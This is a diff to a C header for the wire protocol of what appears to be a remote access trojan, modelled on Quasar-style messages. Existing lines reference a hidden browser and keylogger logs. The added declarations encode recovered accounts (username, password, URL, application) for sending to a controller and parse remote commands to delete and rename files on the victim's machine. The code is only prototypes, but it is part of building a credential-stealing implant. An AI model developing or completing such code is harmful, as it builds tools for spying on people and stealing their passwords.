@@ -68,6 +68,9 @@ int remote_proto_decode_do_start_hidden_browser(const unsigned char* body, unsig
 /* Encode GetDesktopResponse body: Image (4-byte LE length + codec first frame), Quality, Monitor, Resolution. image_data = 4-byte length + image bytes. Returns body length or 0. */
 unsigned int remote_proto_encode_get_desktop_response(const unsigned char* image_data, unsigned int image_len, int quality, int monitor, int width, int height, unsigned char* out, unsigned int out_size);
 
+/* Normalize path in-place: strip BOM/garbage, replace / with \. Use before CreateFileA or FindFirstFileA. */
+void remote_proto_normalize_path(char* path, unsigned int path_size);
+
 /* Parse GetDirectory body: field 1 RemotePath. Copies path into path_buf (max path_buf_size). Returns 1 on success. */
 int remote_proto_decode_get_directory(const unsigned char* body, unsigned int body_len, char* path_buf, unsigned int path_buf_size);
 
@@ -76,6 +79,24 @@ unsigned int remote_proto_encode_get_directory_response(const char* remote_path,
 
 /* Encode GetKeyloggerLogsDirectoryResponse body: field 1 LogsDirectory (string). Returns body length or 0. */
 unsigned int remote_proto_encode_get_keylogger_logs_directory_response(const char* logs_directory, unsigned char* out, unsigned int out_size);
+
+/* Encode GetPasswordsResponse body: field 1 repeated RecoveredAccount. Each: 1 Username, 2 Password, 3 Url, 4 Application. accounts from remote_passwords.h. */
+unsigned int remote_proto_encode_get_passwords_response(const void* accounts, unsigned int count, unsigned char* out, unsigned int out_size);
+
+/* Parse DoPathDelete body: field 1 Path (string), field 2 PathType (varint). *out_path_type: 0=File, 1=Directory. Returns 1 on success. */
+int remote_proto_decode_do_path_delete(const unsigned char* body, unsigned int body_len, char* path_buf, unsigned int path_buf_size, int* out_path_type);
+
+/* Parse DoPathRename body: field 1 Path, 2 NewPath, 3 PathType. Returns 1 on success. */
+int remote_proto_decode_do_path_rename(const unsigned char* body, unsigned int body_len, char* path_buf, unsigned int path_buf_size, char* new_path_buf, unsigned int new_path_buf_size, int* out_path_type);
+
+/* Parse FileTransferCancel body: field 1 Id (varint), optional field 2 Reason (string). Returns 1. */
+int remote_proto_decode_file_transfer_cancel(const unsigned char* body, unsigned int body_len, int* out_id, char* reason_buf, unsigned int reason_buf_size);
+
+/* Encode SetStatusFileManager: field 1 Message (string), field 2 SetLastDirectorySeen (bool). Returns body length or 0. */
+unsigned int remote_proto_encode_set_status_file_manager(const char* message, int set_last_directory_seen, unsigned char* out, unsigned int out_size);
+
+/* Encode FileTransferCancel (client to server): field 1 Id, field 2 Reason. Returns body length or 0. */
+unsigned int remote_proto_encode_file_transfer_cancel(int id, const char* reason, unsigned char* out, unsigned int out_size);
 
 /* Parse FileTransferRequest body: field 1 Id (varint), field 2 RemotePath (string). Returns 1 on success. */
 int remote_proto_decode_file_transfer_request(const unsigned char* body, unsigned int body_len, int* out_id, char* path_buf, unsigned int path_buf_size);
